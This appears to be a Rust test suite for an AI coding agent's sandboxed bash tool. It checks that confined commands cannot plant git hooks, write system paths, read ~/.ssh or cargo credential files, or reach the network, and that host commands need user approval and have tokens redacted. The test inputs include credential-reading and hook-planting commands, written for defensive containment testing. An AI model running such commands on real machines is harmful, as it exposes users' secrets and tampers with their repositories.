        let confined = ToolContext { confined: true, ..approved };
        let out = Bash.run(&git_bash("echo evil > vendor/x/.git/hooks-planted", false), &confined).await.unwrap();
        assert!(!root.path().join("vendor/x/.git/hooks-planted").exists(), "{}", out.output);
        // And without git_write, a new repository goes.
        let out = Bash.run(&git_bash("mkdir -p lib/y/.git", false), &confined).await.unwrap();
        assert!(!root.path().join("lib/y/.git").exists(), "{}", out.output);
    }

    #[tokio::test]
    async fn in_the_sandbox_can_write_the_project_but_not_the_system() {
        require_bwrap!();
        let root = TempDir::new("bash-write");
        assert_eq!(sandboxed("touch made-it && ls made-it", root.path()).await.output, "made-it\n");
        assert_ne!(sandboxed("touch /usr/marv-probe", root.path()).await.exit_code, Some(0));
    }

    #[tokio::test]
    async fn with_project_read_only_the_project_can_be_read_but_not_changed() {
        require_bwrap!();
        let root = TempDir::new("bash-ro");
        root.write("kept.txt", "kept\n");
        let options = RunOptions {
            sandbox: true,
            project_read_only: true,
            ..options("cat kept.txt; touch made-it; echo changed > kept.txt", root.path())
        };
        let result = run_command(options, &Sandbox::from_env(true), &CancellationToken::new()).await;
        assert!(result.output.contains("kept"));
        assert!(result.output.contains("Read-only file system"), "{}", result.output);
        assert!(!root.path().join("made-it").exists());
        assert_eq!(std::fs::read_to_string(root.path().join("kept.txt")).unwrap(), "kept\n");
    }

    #[tokio::test]
    async fn in_the_sandbox_cant_see_the_home_folder() {
        require_bwrap!();
        let root = TempDir::new("bash-home");
        let home = Sandbox::from_env(true).home;
        let result = sandboxed(&format!("ls -A {0}/.ssh {0}/.marv 2>&1; echo done", home.display()), root.path()).await;
        assert!(result.output.contains("No such file"), "{}", result.output);
        assert!(!result.output.contains("config.json"));
    }

    #[tokio::test]
    async fn a_symlinked_credential_file_doesnt_stop_commands_from_starting_and_stays_hidden() {
        require_bwrap!();
        // A fake home with a stow-style link pointing outside ~/.cargo, next to a plain credentials file.
        let root = TempDir::new("bash-creds");
        let home = root.path().join("home");
        root.write("home/dotfiles/cargo-credentials", "token = \"SECRET\"");
        root.write("home/.cargo/credentials.toml", "token = \"SECRET\"");
        std::os::unix::fs::symlink(home.join("dotfiles/cargo-credentials"), home.join(".cargo/credentials")).unwrap();
        std::fs::create_dir(root.path().join("project")).unwrap();
        let sandbox = Sandbox { home, ..Sandbox::from_env(true) };
        let options = RunOptions {
            sandbox: true,
            ..options("cat ~/.cargo/credentials ~/.cargo/credentials.toml; echo started", &root.path().join("project"))
        };
        let result = run_command(options, &sandbox, &CancellationToken::new()).await;
        assert!(result.output.contains("started"), "{}", result.output);
        assert!(!result.output.contains("SECRET"));
    }

    #[tokio::test]
    async fn when_the_sandbox_cant_start_its_error_is_shown() {
        require_bwrap!();
        // A read-only extra given as a symlink inside the project: it can't be mounted safely.
        let root = TempDir::new("bash-nostart");
        let elsewhere = TempDir::new("bash-elsewhere");
        std::os::unix::fs::symlink(elsewhere.path(), root.path().join("link")).unwrap();
        let options =
            RunOptions { sandbox: true, read_only: vec![root.path().join("link")], ..options("echo never", root.path()) };
        let result = run_command(options, &Sandbox::from_env(true), &CancellationToken::new()).await;
        assert_ne!(result.exit_code, Some(0));
        assert!(result.output.starts_with("[sandbox failed to start: "), "{}", result.output);
        assert!(!result.output.contains("never"));
    }

    #[tokio::test]
    async fn in_the_sandbox_there_is_no_network_unless_asked() {
        require_bwrap!();
        let root = TempDir::new("bash-net");
        // /dev/tcp is bash's own, so this needs nothing but bash.
        let probe = "timeout 3 bash -c 'echo > /dev/tcp/1.1.1.1/80' 2>/dev/null; echo exit=$?";
        let offline = sandboxed(probe, root.path()).await;
        assert!(offline.output.starts_with("exit=") && !offline.output.starts_with("exit=0"), "{}", offline.output);
    }

    #[tokio::test]
    async fn a_tool_installed_by_mise_or_asdf_runs_in_the_sandbox() {
        require_bwrap!();
        // A fake home with node in both; `#!/usr/bin/env node` launchers need node resolvable by name.
        let root = TempDir::new("bash-mise");
        let home = root.path().join("home");
        let mise_bin = home.join(".local/share/mise/installs/node/26.8.2/bin");
        let asdf_shims = home.join(".asdf/shims");
        for dir in [&mise_bin, &asdf_shims] {
            std::fs::create_dir_all(dir).unwrap();
            std::fs::write(dir.join("node"), "#!/bin/sh\necho mise-asdf-node ok").unwrap();
            std::fs::set_permissions(dir.join("node"), std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
        }
        std::fs::create_dir(root.path().join("project")).unwrap();
        let base = Sandbox::from_env(true);
        let path = format!("{}:{}:{}", asdf_shims.display(), mise_bin.display(), base.path);
        let sandbox = Sandbox { home, path, ..base };
        let options = RunOptions { sandbox: true, ..options("node", &root.path().join("project")) };
        let result = run_command(options, &sandbox, &CancellationToken::new()).await;
        assert!(result.output.contains("mise-asdf-node ok"), "{}", result.output);
    }

    fn tool_ctx(root: &TempDir, sandbox: bool) -> ToolContext {
        let mut ctx = ToolContext::new(root.path());
        ctx.sandbox = std::sync::Arc::new(Sandbox::from_env(sandbox));
        ctx
    }
    fn bash(command: &str) -> BashInput {
        BashInput { command: command.into(), timeout: None, network: None, git_write: None, sandbox: None }
    }

    #[tokio::test]
    async fn the_hidden_home_note_is_added_in_the_sandbox_after_the_output_without_counting_as_output() {
        require_bwrap!();
        let root = TempDir::new("bash-note-home");
        let result = Bash.run(&bash("echo ~/.marv"), &tool_ctx(&root, true)).await.unwrap();
        assert!(result.output.contains("Marv: ") && result.output.contains("stand-in"));
        assert!(result.output.find("/.marv").unwrap() < result.output.find("Marv: ").unwrap());
        assert_eq!(result.summary, "exit 0 · 1 line of output");
    }

    #[tokio::test]
    async fn the_background_note_is_added_when_a_sandboxed_command_leaves_processes_in_the_background() {
        // Marv issue #50.
        require_bwrap!();
        let root = TempDir::new("bash-note-bg");
        let result = Bash.run(&bash("echo started; sleep 30 &"), &tool_ctx(&root, true)).await.unwrap();
        assert!(result.output.contains(&format!("\n{BACKGROUND_NOTE}\n")), "{}", result.output);
        assert!(result.output.find("started").unwrap() < result.output.find("Marv: ").unwrap());
        assert_eq!(result.summary, "exit 0 · 1 line of output");
        // With the process door, it points at the process tool instead (#51).
        let mut door = tool_ctx(&root, true);
        door.doors.process = true;
        let result = Bash.run(&bash("echo started; sleep 30 &"), &door).await.unwrap();
        assert!(result.output.contains(&format!("\n{BACKGROUND_NOTE_PROCESS}\n")), "{}", result.output);
        assert!(!result.output.contains(BACKGROUND_NOTE));
    }

    #[tokio::test]
    async fn the_background_note_isnt_added_without_the_sandbox_or_for_a_foreground_command() {
        let root = TempDir::new("bash-note-bg-none");
        assert!(!Bash.run(&bash("echo started; true &"), &tool_ctx(&root, false)).await.unwrap().output.contains("Marv: "));
        if sandbox_available() {
            assert!(!Bash.run(&bash("echo started"), &tool_ctx(&root, true)).await.unwrap().output.contains("Marv: "));
        }
    }

    #[tokio::test]
    async fn the_hidden_home_note_isnt_added_without_the_sandbox() {
        let root = TempDir::new("bash-note-nosandbox");
        assert!(!Bash.run(&bash("echo ~/.marv"), &tool_ctx(&root, false)).await.unwrap().output.contains("Marv: "));
    }

    const FAILING: &str = "echo 'curl: (6) Could not resolve host: example.com'; exit 6";
    const GH: &str = "gh() { echo 'The token in default is invalid.'; return 1; }; gh auth status";

    #[tokio::test]
    async fn the_network_note_is_added_when_a_sandboxed_command_without_network_fails_like_that() {
        require_bwrap!();
        let root = TempDir::new("bash-note-net");
        let result = Bash.run(&bash(FAILING), &tool_ctx(&root, true)).await.unwrap();
        assert!(result.output.contains("Marv: this command ran in the sandbox without network"));
        assert!(result.output.contains("network: true"));
        assert!(result.output.find("Could not resolve").unwrap() < result.output.find("Marv: ").unwrap());
        assert_eq!(result.summary, "exit 6 · 1 line of output");
        // Not the gh note: another network-shaped failure only says "retry with network".
        assert!(!result.output.contains("gh auth login"));
    }

    #[tokio::test]
    async fn a_failed_gh_command_is_pointed_at_the_github_mcp_server() {
        // Issue #27: not at logging in again.
        require_bwrap!();
        let root = TempDir::new("bash-note-gh");
        let result = Bash.run(&bash(GH), &tool_ctx(&root, true)).await.unwrap();
        assert!(result.output.contains("network: true"));
        assert!(result.output.contains("don't suggest gh auth login"));
        assert!(result.output.contains("~/.marv/mcp.json"));
    }

    #[tokio::test]
    async fn the_network_note_isnt_added_when_the_command_succeeded_had_network_or_wasnt_found() {
        require_bwrap!();
        let root = TempDir::new("bash-note-none");
        let ctx = tool_ctx(&root, true);
        assert!(!Bash.run(&bash("echo 'Could not resolve host: x'"), &ctx).await.unwrap().output.contains("Marv: "));
        let with_network = BashInput { network: Some(true), ..bash(FAILING) };
        assert!(!Bash.run(&with_network, &ctx).await.unwrap().output.contains("Marv: "));
        assert!(!Bash.run(&bash("echo 'gh: command not found'; exit 127"), &ctx).await.unwrap().output.contains("Marv: "));
    }

    #[tokio::test]
    async fn the_network_note_isnt_added_without_the_sandbox() {
        let root = TempDir::new("bash-note-net-off");
        assert!(!Bash.run(&bash(FAILING), &tool_ctx(&root, false)).await.unwrap().output.contains("Marv: "));
    }

    #[tokio::test]
    async fn a_confined_command_sees_git_read_only_and_learns_how_to_change_it() {
        require_bwrap!();
        let root = TempDir::new("bash-confined");
        crate::test_support::git(root.path(), &["init", "-q"]);
        let ctx = ToolContext { confined: true, ..tool_ctx(&root, true) };
        let result = Bash.run(&bash("touch .git/planted-hook"), &ctx).await.unwrap();
        assert!(result.output.contains("Read-only file system"), "{}", result.output);
        assert!(result.output.contains(GIT_HINT));
        assert!(!root.path().join(".git/planted-hook").exists());
        // Approved (not confined), the same command may change .git.
        let approved = Bash.run(&bash("touch .git/approved"), &tool_ctx(&root, true)).await.unwrap();
        assert!(approved.output.ends_with("[exit code 0]"), "{}", approved.output);
    }

    #[tokio::test]
    async fn a_confined_command_cant_create_a_git_and_the_placeholder_is_removed_afterwards() {
        require_bwrap!();
        let root = TempDir::new("bash-placeholder");
        let ctx = ToolContext { confined: true, ..tool_ctx(&root, true) };
        let result = Bash.run(&bash("git init -q 2>&1; ls -A .git"), &ctx).await.unwrap();
        assert!(!result.output.contains("HEAD"), "{}", result.output);
        assert!(!root.path().join(".git").exists());
    }

    #[tokio::test]
    async fn the_summary_says_how_it_ended() {
        let root = TempDir::new("bash-summary");
        let ctx = tool_ctx(&root, false);
        assert_eq!(Bash.run(&bash("true"), &ctx).await.unwrap().summary, "exit 0");
        assert_eq!(Bash.run(&bash("printf 'a\\nb\\n'; exit 2"), &ctx).await.unwrap().summary, "exit 2 · 2 lines of output");
        let slow = BashInput { timeout: Some(1), ..bash("sleep 5") };
        let result = Bash.run(&slow, &ctx).await.unwrap();
        assert_eq!(result.summary, "timed out after 1s");
        assert!(result.output.ends_with("[timed out after 1s]"));
    }

    // The host door (#52): bash with sandbox: false. Ports the host parts of Marv's tests/bash.test.ts.

    struct Answer(Decision, std::sync::Mutex<Vec<crate::types::ApprovalRequest>>);
    #[async_trait]
    impl crate::types::Approver for Answer {
        async fn approve(&self, request: crate::types::ApprovalRequest) -> Decision {
            self.1.lock().unwrap().push(request);
            self.0
        }
    }
    use crate::types::Decision;

    fn host_call(command: &str, extra: Value) -> marv_core::ToolCall {
        let mut args = json!({"command": command, "sandbox": false});
        args.as_object_mut().unwrap().extend(extra.as_object().unwrap().clone());
        marv_core::ToolCall { id: "h1".into(), name: "bash".into(), arguments: args.to_string() }
    }
    fn asking(root: &TempDir, decision: Decision, host: bool) -> (ToolContext, std::sync::Arc<Answer>) {
        let answer = std::sync::Arc::new(Answer(decision, Default::default()));
        let mut ctx = tool_ctx(root, true);
        ctx.approver = Some(answer.clone());
        ctx.doors.host = host;
        (ctx, answer)
    }
    fn tools() -> Vec<crate::ToolRef> {
        vec![std::sync::Arc::new(Bash)]
    }

    #[test]
    fn the_flag_is_in_the_one_bash_spec_described_as_asking_every_time() {
        let schema = Bash.schema();
        assert!(
            schema["properties"]["sandbox"]["description"].as_str().unwrap().contains(
                "false runs the command on the user's machine, outside the sandbox, with their permissions; always asks."
            )
        );
    }

    #[tokio::test]
    async fn token_shapes_a_host_command_prints_are_redacted_and_the_result_says_so() {
        require_bwrap!();
        let root = TempDir::new("bash-host-redact");
        let token = format!("ghp_{}", "A".repeat(36));
        let (ctx, _) = asking(&root, Decision::Yes, true);
        let out = crate::run_tool(&host_call(&format!("echo \"deploy key {token}\""), json!({})), &ctx, &tools()).await;
        assert!(!out.result.output.contains(&token));
        assert!(out.result.output.contains("deploy key [redacted token]"));
        assert!(out.result.output.contains("Marv: 1 token was redacted from this output."));
        assert!(out.result.summary.contains("1 redacted"), "{}", out.result.summary);
    }

    #[tokio::test]
    async fn host_asks_with_door_host_once_and_its_scope_even_in_yolo_then_runs_with_the_users_env_minus_marvs_keys() {
        require_bwrap!();
        let name =
            "bash::tests::host_asks_with_door_host_once_and_its_scope_even_in_yolo_then_runs_with_the_users_env_minus_marvs_keys";
        if !crate::test_support::in_child_with_env(name, &[("OPENROUTER_API_KEY", "sk-secret"), ("MARV_MODEL", "m")]) {
            return;
        }
        let root = TempDir::new("bash-host");
        let outside = TempDir::new("bash-host-outside");
        let marker = outside.path().join("ran");
        let command =
            format!("touch {}; echo \"xdg=$XDG_RUNTIME_DIR key=$OPENROUTER_API_KEY model=$MARV_MODEL\"", marker.display());
        let (mut ctx, answer) = asking(&root, Decision::Yes, true);
        ctx.yolo = true;
        let out = crate::run_tool(&host_call(&command, json!({"network": true, "git_write": true})), &ctx, &tools()).await;
        let asked = answer.1.lock().unwrap().clone();
        assert_eq!(asked.len(), 1);
        let r = &asked[0];
        assert_eq!((r.door, r.once, r.network), (Some(Door::Host), true, true));
        assert_eq!(r.scope.key, format!("bash:host:{command}"));
        assert_eq!(r.preview.title, "Run a command on your machine");
        assert_eq!(r.preview.command.as_deref(), Some(command.as_str()));
        assert_eq!(out.result.door, Some(Door::Host));
        assert_eq!(out.result.approval, Some(crate::Approval::Decided(Decision::Yes)));
        // The sandbox's /tmp is its own: the file shows up here only if the command ran on the host.
        assert!(marker.exists());
        let xdg = std::env::var("XDG_RUNTIME_DIR").unwrap_or_default();
        assert!(out.result.output.contains(&format!("xdg={xdg} key= model=")), "{}", out.result.output);
        assert!(out.result.summary.contains("on your machine"));
    }

    #[tokio::test]
    async fn without_the_door_its_refused_before_anything_is_asked_and_nothing_runs() {
        require_bwrap!();
        let root = TempDir::new("bash-host-closed");
        let outside = TempDir::new("bash-host-closed-outside");
        let marker = outside.path().join("ran");
        let (mut ctx, answer) = asking(&root, Decision::Yes, false);
        ctx.yolo = true;
        let out = crate::run_tool(&host_call(&format!("touch {}", marker.display()), json!({})), &ctx, &tools()).await;
        assert!(out.result.is_error);
        assert_eq!(out.result.output, NO_HOST_DOOR);
        assert!(answer.1.lock().unwrap().is_empty());
        assert!(!marker.exists());
        // run() checks too, so no way around preview reaches the host.
        let direct = BashInput { sandbox: Some(false), ..bash(&format!("touch {}", marker.display())) };
        assert_eq!(Bash.run(&direct, &tool_ctx(&root, true)).await.unwrap_err().0, NO_HOST_DOOR);
        assert!(!marker.exists());
    }

    #[tokio::test]
    async fn with_the_sandbox_already_off_the_flag_changes_nothing() {
        let root = TempDir::new("bash-host-off");
        let (mut ctx, answer) = asking(&root, Decision::Yes, false);
        ctx.sandbox = std::sync::Arc::new(Sandbox::from_env(false));
        let out = crate::run_tool(&host_call("echo hi", json!({})), &ctx, &tools()).await;
        assert!(out.result.output.contains("hi"), "{}", out.result.output);
        let asked = answer.1.lock().unwrap().clone();
        let r = &asked[0];
        assert_eq!((r.door, r.once, r.network), (None, false, false));
        assert!(r.preview.warning.as_deref().unwrap().contains("the sandbox is off"));
        assert_eq!(r.scope.key, "bash:echo hi");
    }

    #[tokio::test]
    async fn the_network_and_hidden_home_notes_suggest_it_as_a_last_resort_only_where_the_door_is_open() {
        require_bwrap!();
        let root = TempDir::new("bash-host-notes");
        let mut open = tool_ctx(&root, true);
        open.doors.host = true;
        let last_resort = "bash with sandbox: false asks the user to run it on their machine";
        assert!(Bash.run(&bash(FAILING), &open).await.unwrap().output.contains(last_resort));
        assert!(Bash.run(&bash("ls ~/.marv"), &open).await.unwrap().output.contains(last_resort));
        assert!(!Bash.run(&bash(FAILING), &tool_ctx(&root, true)).await.unwrap().output.contains("sandbox: false"));
    }

    /// Marv's tests/github-tool.test.ts, "bash's gh note".
    #[tokio::test]
    async fn the_gh_note_points_to_the_github_tool_where_the_session_has_it_to_the_mcp_server_where_it_doesnt() {
        require_bwrap!();
        let root = TempDir::new("bash-gh-note");
        let mut with = tool_ctx(&root, true);
        with.doors.github = true;
        let gh = bash("gh pr list || exit 1");
        assert!(Bash.run(&gh, &with).await.unwrap().output.contains(GH_TOOL_NOTE));
        let without = Bash.run(&gh, &tool_ctx(&root, true)).await.unwrap().output;
        assert!(without.contains(GH_NOTE));
        assert!(!without.contains(GH_TOOL_NOTE));
    }

    #[test]
    fn scope_and_label() {
        let input =
            BashInput { command: "bun test".into(), timeout: None, network: Some(true), git_write: Some(true), sandbox: None };
        assert_eq!(Bash.scope(&input).unwrap().key, "bash:net:git:bun test");
        assert!(Bash.uses_network(&input));
    }
}
